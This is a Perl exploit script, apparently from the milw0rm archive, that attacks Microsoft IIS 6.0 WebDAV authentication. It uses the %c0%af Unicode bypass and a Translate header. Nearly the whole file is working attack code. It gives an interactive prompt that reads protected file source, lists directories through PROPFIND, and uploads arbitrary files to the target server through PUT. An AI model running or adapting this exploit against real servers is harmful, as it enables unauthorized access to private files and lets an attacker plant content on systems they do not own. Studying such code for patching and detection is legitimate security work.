#!/usr/bin/perl -W
#
# Microsoft IIS 6.0 WebDAV Remote Authentication Bypass Exploit
# written by ka0x <ka0x01[alt+64]gmail.com>
# Advisory: http://www.milw0rm.com/exploits/8765
#
# Greets: an0de, Piker, xarnuz, NullWave07, Pepelux, k0rde, JoSs, Trancek and others!

use IO::Socket ;

my ( $host, $path ) = @ARGV ;
my $port = 80 ; # webserver port

&usage unless $ARGV[1] ;

$host =~ s/http:\/\/// if($host =~ /^http:\/\//i) ;
$path =~ s/\/// if(substr($path, 0,1) eq '/');

sub _file {
	$file = shift ;
	open(FILE, $file) || die "[-] ERROR: ".$!,"\n" ;
	while( <FILE> ){
		$cont .= $_ ;
	}
	close(FILE) ;
	return $cont ;
}


print "write 'help' for get help list\n";


while( 1 ) {

	my $sock = IO::Socket::INET->new (PeerAddr => $host,
					PeerPort => $port,
					Proto    => 'tcp') || die "\n[-] ERROR: ".$!,"\n" ;
	print "\$> ";
	chomp( my $option = <STDIN> ) ;
	last if $option eq 'quit' ;

	if($option eq 'source') {
		$path =~ s/\//%c0%af\// ;
		print $sock "GET /".$path." HTTP/1.1\r\n" ;
		print $sock "Translate: f\r\n" ;
		print $sock "Host: ".$host."\r\n" ;
		print $sock "Connection: close\r\n\r\n" ;

		while(<$sock>){
			print $_ ;
		}
		close($sock) ;
	}


	elsif($option eq 'path') {
		$path =~ s/\//%c0%af\// ;
		print $sock "PROPFIND  /".$path." HTTP/1.1\r\n" ;
		print $sock "Host: ".$host."\r\n" ;
		print $sock "Connection:close\r\n" ;
		print $sock 'Content-Type: text/xml; charset="utf-8"'."\r\n" ;
		print $sock "Content-Length: 0\r\n\r\n" ;
		print $sock  '<?xml version="1.0" encoding="utf-8"?><D:propfind xmlns:D="DAV:"><D:prop xmlns:R="http://www.foo.bar/boxschema/"><R:bigbox/><R:author/><R:DingALing/><R:Random/></D:prop></D:propfind>' ;

		while(<$sock>){
			print $_ ;
		}
		close($sock) ;
	}


	elsif($option eq 'put') {
		$path =~ s/\//%c0%af\// ;
		print "[*] Insert a local file (ex: /root/file.txt): " ;
		chomp( $local = <STDIN> ) ;
		$file_l = _file( $local ) ;
		print $sock "PUT /".$path."my_file.txt HTTP/1.1\r\n" ;
		print $sock "Host: ".$host."\r\n" ;
		print $sock 'Content-Type: text/xml; charset="utf-8"'."\r\n" ;
		print $sock "Connection:close\r\n" ;
		print $sock "Content-Length: ".length($file_l)."\r\n\r\n" ;
		print $sock $file_l,"\r\n" ;

		while(<$sock>){
			print $_ ;
		}
		close($sock) ;
	}

	elsif($option eq 'help') {
		print "\n\t\t- OPTIONS -\n\n\n" ;
		print "\thelp\t\tgive this help list\n" ;
		print "\tsource\t\tget file content\n" ;
		print "\tpath\t\tget directory contents\n" ;
		print "\tput\t\tput file\n" ;
		print "\tquit\t\texit exploit\n\n" ;
	}

}

sub usage {
	print << 'EOH' ;

  $ Microsoft IIS 6.0 WebDAV Remote Authentication Bypass Exploit
  $ written by ka0x <ka0x01[at]gmail.com>
  $ 25/05/2009

usage:
   perl $0 <host> <path>

example:
   perl $0 localhost dir/
   perl $0 localhost dir/file.txt

EOH

	exit;
}




__END__

# milw0rm.com [2009-05-26]